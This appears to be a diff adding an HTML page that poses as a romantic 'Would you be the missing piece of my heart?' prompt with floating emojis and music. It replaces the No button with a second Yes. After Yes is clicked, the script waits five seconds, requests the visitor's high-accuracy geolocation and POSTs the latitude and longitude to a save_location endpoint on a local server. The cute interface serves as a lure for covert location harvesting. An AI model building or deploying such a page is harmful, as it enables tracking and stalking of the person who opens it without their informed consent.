@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>My Heart's Location</title>
+    <style>
+        body {
+            font-family: 'Cursive', Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #ffe6f0;
+            overflow: hidden;
+            position: relative;
+            height: 100vh;
+            width: 100vw;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 20px;
+            cursor: pointer;
+            background-color: #ff66a3;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            transition: background-color 0.3s;
+            margin: 10px;
+            z-index: 2;
+            position: relative;
+        }
+        button:hover {
+            background-color: #ff3385;
+        }
+        #celebration {
+            margin-top: 30px;
+            font-size: 50px;
+            display: none;
+            z-index: 2;
+            position: relative;
+        }
+        #background-floaters {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            overflow: hidden;
+            z-index: 0;
+        }
+        .floater {
+            position: absolute;
+            font-size: 30px;
+            animation: floatUpBackground 10s linear forwards;
+            opacity: 0.8;
+            pointer-events: none;
+        }
+        @keyframes floatUpBackground {
+            0% {
+                transform: translateY(100vh) translateX(0);
+                opacity: 0;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-10vh) translateX(20px);
+                opacity: 0;
+            }
+        }
+        .symbol {
+            position: absolute;
+            font-size: 40px;
+            z-index: 1000;
+            animation: floatUp 5s linear forwards, sway 2s ease-in-out infinite alternate;
+            pointer-events: none;
+        }
+        @keyframes floatUp {
+            0% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-800px);
+                opacity: 0;
+            }
+        }
+        @keyframes sway {
+            0% {
+                transform: translateX(0);
+            }
+            100% {
+                transform: translateX(30px);
+            }
+        }
+        #question {
+            font-size: 30px;
+            margin-top: 100px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 2;
+        }
+        #buttons {
+            position: relative;
+            z-index: 2;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="background-floaters"></div> <!-- Background floaters container -->
+
+    <div id="question">Would you be the missing piece of my heart?</div>
+    <div id="buttons">
+        <button onclick="handleYes()">Yes</button>
+        <button onclick="sayNo()">No</button>
+    </div>
+    <div id="celebration">❤️🌸🎈 I Love You! 🎈🌸❤️</div>
+
+    <!-- Hidden audio player -->
+    <audio id="loveMusic" preload="auto">
+        <source src="https://cdn.pixabay.com/download/audio/2022/02/23/audio_a3e4fa254e.mp3?filename=romantic-piano-112198.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        let askedAgain = false;
+        let backgroundInterval;
+
+        function handleYes() {
+            // Start music
+            playMusic();
+
+            // Show background dense floaters immediately
+            startDenseBackground();
+            document.getElementById("question").innerText = "❤️🌸🎈 I Love You! 🎈🌸❤️";
+            document.getElementById("buttons").style.display = "none";
+            document.getElementById("celebration").style.display = "block";
+
+            // Delay the location sending to let the animation show
+            setTimeout(() => {
+                if (!askedAgain) {
+                    getLocation();
+                }
+            }, 5000); // 5 seconds delay to enjoy floating animation
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(savePosition, showError, { enableHighAccuracy: true });
+            } else {
+                console.log("Your browser doesn't support Geolocation.");
+            }
+        }
+
+        function savePosition(position) {
+            const lat = position.coords.latitude.toFixed(6);
+            const lon = position.coords.longitude.toFixed(6);
+
+            fetch('http://127.0.0.1:5000/save_location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `latitude=${lat}&longitude=${lon}`
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Location saved:', data);
+            })
+            .catch(error => {
+                console.error('Error saving location:', error);
+            });
+        }
+
+        function sayNo() {
+            document.getElementById("question").innerHTML = "Would you reconsider? 😢";
+            document.getElementById("buttons").innerHTML = '<button onclick="handleYes()">Yes</button>';
+            askedAgain = true;
+        }
+
+        function showError(error) {
+            console.log("Couldn't fetch location.");
+        }
+
+        function createFloater(symbols) {
+            const background = document.getElementById('background-floaters');
+            const element = document.createElement('div');
+            element.classList.add('floater');
+            element.innerText = symbols[Math.floor(Math.random() * symbols.length)];
+            
+            element.style.left = Math.random() * 100 + "vw";
+            element.style.fontSize = (20 + Math.random() * 30) + "px";
+            element.style.animationDuration = (8 + Math.random() * 5) + "s";
+
+            background.appendChild(element);
+
+            setTimeout(() => {
+                element.remove();
+            }, 15000);
+        }
+
+        function startBackgroundFloaters() {
+            const symbols = ['❤️', '🌸', '🎈'];
+            setInterval(() => createFloater(symbols), 500);
+        }
+
+        function startDenseBackground() {
+            const symbols = ['❤️', '🌸', '🎈'];
+
+            if (backgroundInterval) clearInterval(backgroundInterval); // clear if already exists
+
+            backgroundInterval = setInterval(() => {
+                for (let i = 0; i < 5; i++) { // make 5 floaters at once to fill fast
+                    createFloater(symbols);
+                }
+            }, 200); // faster rate
+        }
+
+        function playMusic() {
+            const music = document.getElementById('loveMusic');
+            music.play();
+        }
+
+        // Start soft background at first
+        startBackgroundFloaters();
+    </script>
+
+</body>
+</html>
